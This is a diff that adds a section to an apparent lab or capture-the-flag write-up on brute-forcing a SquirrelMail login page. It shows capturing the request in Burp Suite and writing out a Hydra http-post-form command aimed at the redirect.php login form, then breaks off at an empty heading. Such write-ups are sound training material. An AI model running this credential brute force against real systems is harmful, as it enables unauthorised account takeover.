@@ -195,4 +195,23 @@ After the gobuster we have identified an interesting sub-directory:
 We now have a login page to try and bruteforce the username and password list.
 
 Let us use Hydra to do this
-### 
+
+# Bruteforcing Squirrelmail Directory with Hydra
+
+## Capture Burpsuite request
+1. The first step is to capture the request of the webpage using burpsuite
+![[Pasted image 20251021194717.png]]
+
+## Creating Hydra bruteforce Payload (http-post-form)
+
+We will use the http-post-form payload since this is a webpage to bruteforce the login
+```
+hydra -l username -P password_list.txt ip_address http-post-form '/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect.'
+```
+
+![[Pasted image 20251021195208.png]]
+
+The above image is how we construct the http-post-form payload for http bruteforce 
+## Bruteforcing 
+
+
